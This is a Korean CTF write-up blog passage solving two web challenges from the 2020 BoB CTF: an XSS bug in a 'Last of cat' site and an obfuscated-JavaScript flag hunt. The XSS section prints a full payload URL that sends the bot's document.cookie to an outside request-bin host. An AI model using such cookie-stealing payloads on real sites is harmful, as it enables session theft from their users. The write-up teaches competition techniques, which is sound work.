<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="google-site-verification" content="soS2al0KuMZmiyPzu87KFbqGSn0K9edQ8EkWp_m35n0" />
  

  <!-- Begin Jekyll SEO tag v2.6.1 -->
<title>2020 BoB 9th CTF Write-up | Core-Research-Team</title>
<meta name="generator" content="Jekyll v4.0.1" />
<meta property="og:title" content="2020 BoB 9th CTF Write-up" />
<meta name="author" content="all" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="🖥️ WEB" />
<meta property="og:description" content="🖥️ WEB" />
<link rel="canonical" href="http://localhost:4000/2020-09-01/2020-BoB-CTF-Write-up" />
<meta property="og:url" content="http://localhost:4000/2020-09-01/2020-BoB-CTF-Write-up" />
<meta property="og:site_name" content="Core-Research-Team" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-09-01T00:00:00+00:00" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"2020 BoB 9th CTF Write-up","dateModified":"2020-09-01T00:00:00+00:00","datePublished":"2020-09-01T00:00:00+00:00","author":{"@type":"Person","name":"all"},"url":"http://localhost:4000/2020-09-01/2020-BoB-CTF-Write-up","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020-09-01/2020-BoB-CTF-Write-up"},"description":"🖥️ WEB","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <!-- CSS -->
  <link rel="stylesheet" href="/assets/main.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">

  <!-- Favicon -->
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon.ico">

  <!-- RSS -->
  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Core-Research-Team" />

  <!-- Google Analytics-->
  
 
</head>


  <body>

    <nav class="nav">
  <div class="nav-container">
    <a href="/">
      <h2 class="nav-title">RAON - Core Research Team</h2>
    </a>
    <ul>
      <li><a href="/about">About</a></li>
      <li><a href="/">Posts</a></li>
    </ul>
  </div>
</nav>


    <main>
      <div class="post"> 
   <h1 class="post-title">2020 BoB 9th CTF Write-up</h1>
   <div class="post-line"></div>

   
      
         
            <span class="tag"><center><i>write-up</i></center></span>
         
      
         
            <span class="tag"><center><i>CTF</i></center></span>
         
      
   
   
   <ul class="section-nav">
<li class="toc-entry toc-h1"><a href="#️-web">🖥️ WEB</a>
<ul>
<li class="toc-entry toc-h2"><a href="#last-of-cat">Last of cat</a></li>
<li class="toc-entry toc-h2"><a href="#king-musae">King musae</a></li>
<li class="toc-entry toc-h2"><a href="#fun-fun-game">Fun Fun Game</a></li>
<li class="toc-entry toc-h2"><a href="#babyweb">babyweb</a></li>
<li class="toc-entry toc-h2"><a href="#catdog">CatDog</a></li>
<li class="toc-entry toc-h2"><a href="#jwt-extended">JWT-Extended</a></li>
</ul>
</li>
<li class="toc-entry toc-h1"><a href="#️-reversing">🖥️ REVERSING</a>
<ul>
<li class="toc-entry toc-h2"><a href="#gocat">gocat</a></li>
<li class="toc-entry toc-h2"><a href="#bvm-rev">bvm-rev</a></li>
<li class="toc-entry toc-h2"><a href="#hot-patching">Hot Patching</a></li>
<li class="toc-entry toc-h2"><a href="#hot-patching-777">Hot Patching 777</a></li>
<li class="toc-entry toc-h2"><a href="#easyroid">EASYROID</a></li>
</ul>
</li>
<li class="toc-entry toc-h1"><a href="#️-forensic">🖥️ FORENSIC</a>
<ul>
<li class="toc-entry toc-h2"><a href="#sql-eyes">SQL Eyes</a></li>
</ul>
</li>
<li class="toc-entry toc-h1"><a href="#️-pwn">🖥️ PWN</a>
<ul>
<li class="toc-entry toc-h2"><a href="#bvm-pwn">bvm-pwn</a></li>
<li class="toc-entry toc-h2"><a href="#cluster_shell">cluster_shell</a></li>
<li class="toc-entry toc-h2"><a href="#porn-master">Porn Master</a></li>
<li class="toc-entry toc-h2"><a href="#housepital">Housepital</a></li>
<li class="toc-entry toc-h2"><a href="#corona">Corona</a></li>
</ul>
</li>
<li class="toc-entry toc-h1"><a href="#️-crypto">🖥️ CRYPTO</a>
<ul>
<li class="toc-entry toc-h2"><a href="#easy-rsa">Easy RSA</a></li>
<li class="toc-entry toc-h2"><a href="#boom-boom">Boom Boom</a></li>
</ul>
</li>
<li class="toc-entry toc-h1"><a href="#️-misc">🖥️ MISC</a>
<ul>
<li class="toc-entry toc-h2"><a href="#gift">‘gif’t</a></li>
<li class="toc-entry toc-h2"><a href="#hide-and-seek">Hide And Seek</a></li>
<li class="toc-entry toc-h2"><a href="#catcha">Catcha</a></li>
<li class="toc-entry toc-h2"><a href="#verrox">verrox</a></li>
</ul>
</li>
</ul><h1 id="️-web">
<a class="anchor" href="#%EF%B8%8F-web" aria-hidden="true"><span class="octicon octicon-link"></span></a>🖥️ WEB</h1>

<h2 id="last-of-cat">
<a class="anchor" href="#last-of-cat" aria-hidden="true"><span class="octicon octicon-link"></span></a>Last of cat</h2>

<p><img src="/assets/bob/bob9Untitled.png" alt="/assets/bob/bob9Untitled.png"></p>

<p><img src="/assets/bob/bob91.png" alt="/assets/bob/bob91.png"></p>

<ul>
  <li>
<code class="highlighter-rouge">Last of Cat</code>  페이지에 접속하면 <code class="highlighter-rouge">Login Page</code>가 출력됩니다.  회원가입을 하기 위해 <code class="highlighter-rouge">Join</code> 버튼을 클릭한다.</li>
</ul>

<p><img src="/assets/bob/bob92.png" alt="/assets/bob/bob92.png"></p>

<ul>
  <li>회원가입하고 로그인을 하여 메뉴를 확인한다.</li>
</ul>

<p><img src="/assets/bob/bob93.png" alt="/assets/bob/bob93.png"></p>

<ul>
  <li>
<code class="highlighter-rouge">Cat</code>메뉴에서는 고양이 사진을 확인할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob94.png" alt="/assets/bob/bob94.png"></p>

<ul>
  <li>
<code class="highlighter-rouge">Bot</code> 에서는 <code class="highlighter-rouge">Input URL</code> 기능을 통해 봇에게 XSS 구문을 전송할 수 있다. 아래 <code class="highlighter-rouge">Bot Log</code>  테이블에서 봇이 내 URL을 확인했는지 바로 확인이 가능하다.</li>
</ul>

<blockquote>
  <p>이 문제는 XSS가 발생하는 페이지를 찾아 해당 페이지를 통해 <strong>쿠키를 탈취하는 스크립트를 작성하면 풀리는</strong> 간단한 문제다.</p>
</blockquote>

<p><img src="/assets/bob/bob95.png" alt="/assets/bob/bob95.png"></p>

<ul>
  <li>Cat Page에 접속하면 위 화면과 같은 고양이 사진과 문구가 출력된다.</li>
  <li>사진과 문구를 출력하는 루틴을 살펴보면, src 파라미터를 통해 html을 읽어온다. 해당 기능을 이용하여 XSS를 발생시킬 수 있다.</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://bob.zairo.kr:1337/catview?**src=http://bob.zairo.kr:1337/cats/ae7d0baaa9b7ad791a6bfa53c936490e.html**
</code></pre></div></div>

<p><img src="/assets/bob/bob96.png" alt="/assets/bob/bob96.png"></p>

<p><img src="/assets/bob/bob97.png" alt="/assets/bob/bob97.png"></p>

<ul>
  <li>
<code class="highlighter-rouge">Cat</code> 페이지에서  <code class="highlighter-rouge">View</code> 버튼을 클릭할때를 Fiddler로 살펴보면 <code class="highlighter-rouge">getlink</code> 페이지에 <code class="highlighter-rouge">idx=숫자</code> 형식으로 페이지를 요청하는것을 확인할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob98.png" alt="/assets/bob/bob98.png"></p>

<ul>
  <li>
<code class="highlighter-rouge">/getlink?idx=2</code> 에 접속하면 위와 같이 idx와 link가 출력된다.</li>
</ul>

<p><img src="/assets/bob/bob99.png" alt="/assets/bob/bob99.png"></p>

<ul>
  <li>getlink 페이지에 임의 값을 입력할 경우 그대로 출력해주는데 해당 페이지의 응답의 <code class="highlighter-rouge">Content-Type</code> 은 <code class="highlighter-rouge">application/json</code>이라 스크립트가 실행되지 않는다. 하지만, 특정 페이지를 로드시켜 페이지 내부에 포함하는 경우 해당 페이지를 이용하여 XSS를 발생시킬 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob910.png" alt="/assets/bob/bob910.png"></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[http://bob.zairo.kr:1337/catview?src=**http%3A%2F%2Fbob.zairo.kr%3A1337%2Fgetlink%3Fidx%3D](http://bob.zairo.kr:1337/catview?src=http%3A%2F%2Fbob.zairo.kr%3A1337%2Fgetlink%3Fidx%3D%253Cscript%253Ealert(1)%253C%252Fscript%253E)%253Cscript%253Ealert(1)%253C%252Fscript%253E**
</code></pre></div></div>

<ul>
  <li>
<code class="highlighter-rouge">src</code>에 getlink 페이지 idx 파라미터 값에 <code class="highlighter-rouge">[&lt;script&gt;alert(1);&lt;/script&gt;](http://bob.zairo.kr:1337/getlink?idx=&lt;script&gt;alert(1)&lt;/script&gt;)</code> 를 2번 URL Encoding 하여 입력하면 그림과 같이 alert 구문이 실행되는 것을 확인할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob911.png" alt="/assets/bob/bob911.png"></p>

<ul>
  <li>
<code class="highlighter-rouge">request bin</code>을 이용해 임의 서버로 쿠키를 전송하도록 하여 탈취하도록 한다</li>
</ul>

<p><img src="/assets/bob/bob912.png" alt="/assets/bob/bob912.png"></p>

<p><strong>Payload</strong></p>

<blockquote>
  <p><a href="http://bob.zairo.kr:1337/catview?src=http://bob.zairo.kr:1337/getlink?idx=http%253A%252F%252Fbob.zairo.kr%253A1337%252Fgetlink%253Fidx%253D%253Cscript%253Edocument.location.href%253D%2527https%253A%252F%252Fenwm946jeqwe.x.pipedream.net%252F%253Fparam%2527%252Bdocument.cookie%253C%252Fscript%253E">http://bob.zairo.kr:1337/catview?src=http://bob.zairo.kr:1337/getlink?idx=http%3A%2F%2Fbob.zairo.kr%3A1337%2Fgetlink%3Fidx%3D%3Cscript%3Edocument.location.href%3D%27https%3A%2F%2Fenwm946jeqwe.x.pipedream.net%2F%3Fparam%27%2Bdocument.cookie%3C%2Fscript%3E</a></p>
</blockquote>

<blockquote>
  <p><a href="http://bob.zairo.kr:1337/catview?src=http://bob.zairo.kr:1337/getlink?idx=http://bob.zairo.kr:1337/getlink?idx=">http://bob.zairo.kr:1337/catview?src=http://bob.zairo.kr:1337/getlink?idx=http://bob.zairo.kr:1337/getlink?idx=</a><strong>&lt;script&gt;document.location.href=’<a href="https://enwm946jeqwe.x.pipedream.net/?param">https://enwm946jeqwe.x.pipedream.net/?param</a>’+ document.cookie&lt;/script&gt;</strong></p>
</blockquote>

<ul>
  <li>위 구문을 통해 <code class="highlighter-rouge">catview</code> 페이지에서 <code class="highlighter-rouge">src</code> 파라미터로 값을 처리할 때 <code class="highlighter-rouge">getlink</code> 페이지에 접속하고 <code class="highlighter-rouge">getlink</code> 페이지의 <code class="highlighter-rouge">idx</code>에 입력 되어 있는 스크립트 구문이 실행되어 결국 쿠키를 탈취 할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob913.png" alt="/assets/bob/bob913.png"></p>

<p><br></p>

<p><br></p>

<h2 id="king-musae">
<a class="anchor" href="#king-musae" aria-hidden="true"><span class="octicon octicon-link"></span></a>King musae</h2>

<hr>

<p><img src="/assets/bob/bob914.png" alt="/assets/bob/bob914.png"></p>

<p>[Javasciprt 난독화]
해당 문제는 Javascript 난독화이며, 간단하게 플래그가 숨겨져 있는 문제임
(본 문제는 <a href="https://m.blog.naver.com/chiot_aile/221592247073">로얄 마카롱 앵무새</a>가 생각나서 만들게 되었으며,  라온에 놀러오시면 꼭 여기 마카롱집 가야됩니다.)</p>

<p>풀이는 어렵지 않으며, 간단하다. 별다른 안티 디버깅 및 복잡한 난독화가 아닌 단순히 플래그가 출력되지 못하도록 변수에 저장되어있는 걸 찾는 문제임</p>

<h3 id="1-문제-파악하기">1. 문제 파악하기</h3>

<ul>
  <li>문제 사이트에 접속하면 Javascript Alert로 “<strong>find Flag</strong>“를 출력된다.</li>
</ul>

<p><img src="/assets/bob/bob915.png" alt="/assets/bob/bob915.png"></p>

<ul>
  <li>Chrome 개발자 도구인 소스코드 보기를 눌러 자바스크립트 코드를 확인해보면 아래와 같이 난독화된 자바스크립트 코드를 확인할 수 있다.</li>
</ul>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">𓆓</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">{}</span><span class="dl">"</span><span class="p">,</span><span class="err">𓅧</span><span class="o">=</span><span class="dl">''</span><span class="p">,</span><span class="err">𓃟</span><span class="o">=</span><span class="dl">'</span><span class="s1">@</span><span class="dl">'</span><span class="p">,</span><span class="err">𓅀</span><span class="o">=</span><span class="dl">"</span><span class="s2">test</span><span class="dl">"</span><span class="p">,</span><span class="err">𓅂</span><span class="o">=</span><span class="dl">''</span><span class="p">,</span><span class="err">𓊎</span><span class="o">=</span><span class="err">𓅂</span><span class="o">+</span><span class="p">{},</span><span class="err">𓆂</span> <span class="o">=</span> <span class="dl">''</span><span class="p">,</span><span class="err">𓇎</span><span class="o">=</span><span class="err">𓅂</span><span class="p">,</span><span class="err">𓅿</span> <span class="o">=</span> <span class="err">𓅂</span><span class="o">+</span><span class="err">𓅂</span><span class="p">[[]],</span><span class="err">𓆟</span><span class="o">=</span><span class="err">𓅂</span><span class="p">,</span><span class="o">++</span><span class="err">𓇎</span><span class="p">,</span><span class="err">𓆟</span><span class="o">=</span><span class="err">𓊎</span><span class="p">[</span><span class="o">++</span><span class="err">𓇎</span><span class="p">],</span><span class="o">++</span><span class="err">𓆂</span><span class="p">,</span><span class="o">++</span><span class="err">𓆂</span><span class="p">,</span><span class="o">++</span><span class="err">𓆂</span><span class="p">,</span><span class="err">𓆟</span><span class="o">+=</span><span class="err">𓊎</span><span class="p">[</span><span class="o">--</span><span class="err">𓇎</span><span class="p">],</span><span class="o">++</span><span class="err">𓆂</span><span class="p">,</span><span class="err">𓆟</span><span class="o">+=</span><span class="err">𓊎</span><span class="p">[</span><span class="o">++</span><span class="err">𓇎</span><span class="p">],</span><span class="err">𓆟</span><span class="o">+=</span><span class="err">𓆓</span><span class="p">[</span><span class="err">𓅧</span><span class="o">++</span><span class="p">],</span><span class="err">𓄧</span><span class="o">=</span><span class="err">𓊎</span><span class="p">,</span><span class="o">--</span><span class="err">𓇎</span><span class="p">,</span><span class="o">--</span><span class="err">𓇎</span><span class="p">,</span><span class="err">𓆲</span><span class="o">=</span><span class="err">𓅿</span><span class="p">[</span><span class="err">𓆂</span><span class="o">++</span><span class="p">],</span> <span class="err">𓆲</span><span class="o">+=</span><span class="err">𓅿</span><span class="p">[</span><span class="err">𓆂</span><span class="o">++</span><span class="p">],</span><span class="err">𓆲</span><span class="o">+=</span><span class="err">𓅿</span><span class="p">[</span><span class="err">𓆂</span><span class="o">++</span><span class="p">],</span><span class="o">++</span><span class="err">𓆂</span><span class="p">,</span><span class="err">𓆲</span><span class="o">+=</span><span class="err">𓅿</span><span class="p">[</span><span class="err">𓆂</span><span class="o">++</span><span class="p">],</span><span class="err">𓂀</span><span class="o">=!</span><span class="err">𓅂</span><span class="o">+</span><span class="err">𓅂</span><span class="p">,</span><span class="err">𓁄</span><span class="o">=!</span><span class="err">𓂀</span><span class="o">+</span><span class="err">𓅂</span><span class="p">,</span><span class="o">++</span><span class="err">𓇎</span><span class="p">,</span><span class="err">𓅧</span><span class="p">,</span><span class="err">𓆣</span><span class="o">=</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓅂</span><span class="o">++</span><span class="p">],</span><span class="err">𓊝</span><span class="o">=</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓇎</span><span class="o">=</span><span class="err">𓅂</span><span class="p">],</span><span class="err">𓆂</span><span class="o">--</span><span class="p">,</span><span class="o">--</span><span class="err">𓆂</span><span class="p">,</span><span class="err">𓆌</span><span class="o">=</span><span class="err">𓊝</span><span class="o">+</span><span class="err">𓃟</span><span class="o">+</span><span class="err">𓊎</span><span class="p">[</span><span class="err">𓇎</span><span class="p">]</span><span class="o">+</span><span class="err">𓅿</span><span class="p">[</span><span class="o">--</span><span class="err">𓆂</span><span class="p">],</span><span class="err">𓏢</span><span class="o">=++</span><span class="err">𓇎</span><span class="o">+</span><span class="err">𓅂</span><span class="p">,</span><span class="err">𓆗</span><span class="o">=</span><span class="err">𓊎</span><span class="p">[</span><span class="err">𓇎</span><span class="o">+</span><span class="err">𓏢</span><span class="p">],</span><span class="err">𓆌</span><span class="o">+=</span><span class="err">𓆓</span><span class="p">[</span><span class="err">𓅧</span><span class="p">],</span><span class="err">𓆓</span><span class="p">[</span><span class="err">𓆡</span><span class="o">=</span><span class="err">𓆟</span><span class="o">+</span><span class="err">𓄧</span><span class="o">+</span><span class="err">𓆌</span><span class="p">],</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓆗</span><span class="o">+=</span><span class="err">𓊎</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="p">(</span><span class="err">𓂀</span><span class="p">.</span><span class="err">𓁄</span><span class="o">+</span><span class="err">𓊎</span><span class="p">)[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="err">𓁄</span><span class="p">[</span><span class="err">𓏢</span><span class="p">]</span><span class="o">+</span><span class="err">𓆣</span><span class="o">+</span><span class="err">𓊝</span><span class="o">+</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓇎</span><span class="p">]</span><span class="o">+</span><span class="err">𓆗</span><span class="o">+</span><span class="err">𓆣</span><span class="o">+</span><span class="err">𓊎</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="err">𓊝</span><span class="p">][</span><span class="err">𓆗</span><span class="p">](</span><span class="err">𓁄</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="err">𓁄</span><span class="p">[</span><span class="err">𓇎</span><span class="p">]</span><span class="o">+</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓏢</span><span class="p">]</span><span class="o">+</span><span class="err">𓊝</span><span class="o">+</span><span class="err">𓆣</span><span class="o">+</span><span class="dl">"</span><span class="s2">('</span><span class="dl">"</span><span class="o">+</span><span class="err">𓆲</span><span class="o">+</span><span class="dl">"</span><span class="s2"> Flag')</span><span class="dl">"</span><span class="p">)</span><span class="s2">``</span>
</code></pre></div></div>

<ul>
  <li>우선 난독화된 자바스크립트를 파악하기 전 “alert” 문자열 없이 alert가 실행된 건 알 수 있으며,  해당 코드가 어떻게 실행되었는지 “<strong>`</strong>” 벡터를 제거하여 난독화된 자바스크립트가 실행되지 않도록 chrome console에 넣어보면 아래와 같이 코드가 구현되어 있는 걸 알 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob916.png" alt="/assets/bob/bob916.png"></p>

<ul>
  <li>하지만 변수에 저장된 Flag는 알 수 없었지만 난독화된 코드를 통하여 alert가 실행된건 알 수 있다.</li>
</ul>

<p>보다 쉬운 예제는 “<a href="https://twitter.com/aemkei/status/1262872762621837314">Martin Kleppe</a>“가 작성한 코드를 보면 더 쉽게 알 수 있다.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="err">𓀀</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">𓅂</span><span class="dl">'</span><span class="p">;</span>
<span class="kd">function</span> <span class="err">𓆣</span><span class="p">(</span><span class="err">𓂀</span><span class="p">){</span> <span class="nx">alert</span><span class="p">(</span><span class="err">𓂀</span><span class="p">);</span> <span class="p">}</span>
<span class="err">𓆣</span><span class="p">(</span><span class="err">𓀀</span><span class="p">);</span>
</code></pre></div></div>

<p>[Martin Kleppe의 special characters]</p>

<p>위 코드를 브라우저에서 실행되면 새가 출력되는걸 볼 수 있으며, 위 코드를 하나씩 설명하면</p>

<p>먼저 “<strong>𓀀</strong>” 변수에 싱글 쿼터로 문자열로 만들어 ‘<strong>𓅂</strong>’ 새를 저장한다.</p>

<p>그리고 사용자 정의 함수를 만드는 과정에서 함수 이름 대신 “𓆣” 장수 풍댕이로 선언하고 인자명 대신 “𓂀” 나뭇잎을 선언하고 내부 로직은 alert를 통하여 전달된 인자(나뭇잎)를 통하여 출력되는 로직이다.</p>

<p>그러므로 최종적으로 장수 풍댕이(함수)를 새가 저장된 “<strong>𓀀”</strong>변수를 인자로 전달하여 결국엔 새가 출력되는 로직이다. <em>**</em>여기까지 이해가 되었다면 아래 예제에서 난독화에 대해 좀더 알아보도록 하자.</p>

<h3 id="2-로직-파악하기">2. 로직 파악하기</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">𓅂</span><span class="o">=</span><span class="dl">''</span>             <span class="c1">//    ""</span>
<span class="err">𓂀</span><span class="o">=!</span><span class="err">𓅂</span><span class="o">+</span><span class="err">𓅂</span>        <span class="c1">//    "true"</span>
<span class="err">𓁄</span><span class="o">=!</span><span class="err">𓂀</span><span class="o">+</span><span class="err">𓅂</span>         <span class="c1">//    "false"</span>
<span class="err">𓊎</span><span class="o">=</span><span class="err">𓅂</span><span class="o">+</span><span class="p">{}</span>          <span class="c1">//    "[object Object]"</span>

<span class="err">𓆣</span><span class="o">=</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓅂</span><span class="o">++</span><span class="p">]</span>        <span class="c1">//   "r" (𓅂 = 2)</span>
<span class="err">𓊝</span><span class="o">=</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓇎</span><span class="o">=</span><span class="err">𓅂</span><span class="p">]</span>       <span class="c1">//   "u" (𓇎  = 2)</span>
<span class="err">𓏢</span><span class="o">=++</span><span class="err">𓇎</span><span class="o">+</span><span class="err">𓅂</span>          <span class="c1">//    5  (𓇎 = 3), (𓇎3 + 𓅂2)</span>
<span class="err">𓆗</span><span class="o">=</span><span class="err">𓊎</span><span class="p">[</span><span class="err">𓇎</span><span class="o">+</span><span class="err">𓏢</span><span class="p">]</span>         <span class="c1">//    "O"</span>

<span class="err">𓂀</span>                 <span class="c1">//   "true"</span>
<span class="err">𓆗</span><span class="o">+=</span><span class="err">𓊎</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span>         <span class="c1">//   "co"</span>
<span class="p">(</span><span class="err">𓂀</span><span class="p">.</span><span class="err">𓁄</span><span class="o">+</span><span class="err">𓊎</span><span class="p">)[</span><span class="err">𓅂</span><span class="p">]</span>    <span class="c1">//    "n"</span>
<span class="err">𓁄</span><span class="p">[</span><span class="err">𓏢</span><span class="p">]</span>              <span class="c1">//   "s"</span>
<span class="err">𓆣</span>                 <span class="c1">//   "t"</span>
<span class="err">𓊝</span>                 <span class="c1">//   "r"</span>
<span class="err">𓊎</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span>            <span class="c1">//   "o"</span>
<span class="err">𓊝</span>                <span class="c1">//    "r"</span>
<span class="err">𓆗</span>                 <span class="c1">//   "constructor"</span>

<span class="err">𓂀</span><span class="p">[</span><span class="err">𓆗</span><span class="o">+=</span><span class="err">𓊎</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="p">(</span><span class="err">𓂀</span><span class="p">.</span><span class="err">𓁄</span><span class="o">+</span><span class="err">𓊎</span><span class="p">)[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="err">𓁄</span><span class="p">[</span><span class="err">𓏢</span><span class="p">]</span><span class="o">+</span><span class="err">𓆣</span><span class="o">+</span>
<span class="err">𓊝</span><span class="o">+</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓇎</span><span class="p">]</span><span class="o">+</span><span class="err">𓆗</span><span class="o">+</span><span class="err">𓆣</span><span class="o">+</span><span class="err">𓊎</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="err">𓊝</span><span class="p">][</span><span class="err">𓆗</span><span class="p">]</span>
<span class="c1">//   ƒ Function() { [native code] }</span>

<span class="err">𓁄</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span>             <span class="c1">//   "a"</span>
<span class="err">𓁄</span><span class="p">[</span><span class="err">𓇎</span><span class="p">]</span>              <span class="c1">//   "l"</span>
<span class="err">𓂀</span><span class="p">[</span><span class="err">𓏢</span><span class="p">]</span>              <span class="c1">//   "e"</span>
<span class="err">𓊝</span>                 <span class="c1">//   "r"</span>
<span class="err">𓆣</span>                  <span class="c1">//   "t"</span>

<span class="err">𓁄</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="err">𓁄</span><span class="p">[</span><span class="err">𓇎</span><span class="p">]</span><span class="o">+</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓏢</span><span class="p">]</span><span class="o">+</span><span class="err">𓊝</span><span class="o">+</span><span class="err">𓆣</span> <span class="c1">// "alert"</span>

<span class="err">𓂀</span><span class="p">[</span><span class="err">𓆗</span><span class="o">+=</span><span class="err">𓊎</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="p">(</span><span class="err">𓂀</span><span class="p">.</span><span class="err">𓁄</span><span class="o">+</span><span class="err">𓊎</span><span class="p">)[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="err">𓁄</span><span class="p">[</span><span class="err">𓏢</span><span class="p">]</span><span class="o">+</span><span class="err">𓆣</span><span class="o">+</span>
<span class="err">𓊝</span><span class="o">+</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓇎</span><span class="p">]</span><span class="o">+</span><span class="err">𓆗</span><span class="o">+</span><span class="err">𓆣</span><span class="o">+</span><span class="err">𓊎</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="err">𓊝</span><span class="p">][</span><span class="err">𓆗</span><span class="p">](</span><span class="err">𓁄</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="err">𓁄</span><span class="p">[</span><span class="err">𓇎</span><span class="p">]</span><span class="o">+</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓏢</span><span class="p">]</span><span class="o">+</span><span class="err">𓊝</span><span class="o">+</span><span class="err">𓆣</span><span class="o">+</span><span class="dl">"</span><span class="s2">('</span><span class="dl">"</span><span class="o">+</span><span class="err">𓆲</span><span class="o">+</span><span class="dl">"</span><span class="s2"> Flag')</span><span class="dl">"</span><span class="p">)</span>
<span class="c1">// ƒ anonymous(</span>
<span class="c1">// ) {</span>
<span class="c1">// alert('find Flag')</span>
<span class="c1">// }</span>

<span class="err">𓂀</span><span class="p">[</span><span class="err">𓆗</span><span class="p">][</span><span class="err">𓆗</span><span class="p">]</span>
<span class="c1">// ƒ Function() { [native code] }</span>

<span class="err">𓂀</span><span class="p">[</span><span class="err">𓆗</span><span class="p">][</span><span class="err">𓆗</span><span class="p">](</span><span class="err">𓁄</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span><span class="o">+</span><span class="err">𓁄</span><span class="p">[</span><span class="err">𓇎</span><span class="p">]</span><span class="o">+</span><span class="err">𓂀</span><span class="p">[</span><span class="err">𓏢</span><span class="p">]</span><span class="o">+</span><span class="err">𓊝</span><span class="o">+</span><span class="err">𓆣</span><span class="o">+</span><span class="dl">"</span><span class="s2">('DongDongE')</span><span class="dl">"</span><span class="p">)</span><span class="s2">``</span>
<span class="c1">//ƒ anonymous(</span>
<span class="c1">//) {</span>
<span class="c1">//alert('DongDongE')</span>
<span class="c1">//}</span>
</code></pre></div></div>

<ul>
  <li>위와 같이 alert를 출력하기 위해 각종 문자열 조합으로 Function을 만들고 문자를 조합 한다.</li>
</ul>

<p>위 코드가 그래도 어렵다면 아래 예제에서 간단하게 풀어서 알아보도록 하자.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">𓁄</span><span class="p">[</span><span class="err">𓅂</span><span class="p">]</span>             <span class="c1">//   "a"       "false" 문자열의 2번째 "a"</span>
<span class="err">𓁄</span><span class="p">[</span><span class="err">𓇎</span><span class="p">]</span>              <span class="c1">//   "l"       "false" 문자열의 3번째 "ㅣ"</span>
<span class="err">𓂀</span><span class="p">[</span><span class="err">𓏢</span><span class="p">]</span>              <span class="c1">//   "e"       "true"  문자열의 4번째 "e"</span>
<span class="err">𓊝</span>                 <span class="c1">//   "r"       "true"  문자열의 2번째 "r"</span>
<span class="err">𓆣</span>                  <span class="c1">//   "t"       "true"  문자열의 1번째 "t"</span>
</code></pre></div></div>

<p>위 코드와 같이 “false”와 “true”의 문자열을 하나씩 추출하여 조합하면 “alert”가 되어 alert가 문자열에서 function으로 실행되도록 하는 원리이다.</p>

<p>그러면 위 플래그를 얻기 위해 하나씩 변수를 출력해보면 플래그가 출력된다.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">𓆡</span><span class="o">=</span><span class="err">𓆟</span><span class="o">+</span><span class="err">𓄧</span><span class="o">+</span><span class="err">𓆌</span>
<span class="dl">"</span><span class="s2">bob{[object Object]r@on}</span><span class="dl">"</span>
</code></pre></div></div>

<ul class="task-list">
  <li class="task-list-item">
    <p><input type="checkbox" class="task-list-item-checkbox" disabled checked>Flag is bob{[object Object]r@on}</p>
  </li>
  <li class="task-list-item">
